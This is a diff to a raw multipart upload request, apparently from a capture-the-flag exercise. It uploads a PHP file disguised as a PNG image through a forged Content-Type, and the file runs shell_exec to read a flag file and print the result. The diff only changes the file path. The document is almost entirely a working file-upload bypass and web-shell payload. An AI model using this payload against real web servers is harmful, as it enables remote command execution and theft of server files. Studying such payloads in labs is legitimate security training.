@@ -3,7 +3,7 @@ Content-Disposition: form-data; name="file"; filename="a.php"
 Content-Type: image/png
 
 <?php
-$output = shell_exec('cat ../flag.txt');
+$output = shell_exec('cat /flag.txt');
 echo "<pre>$output</pre>";
 exit;
 ?>
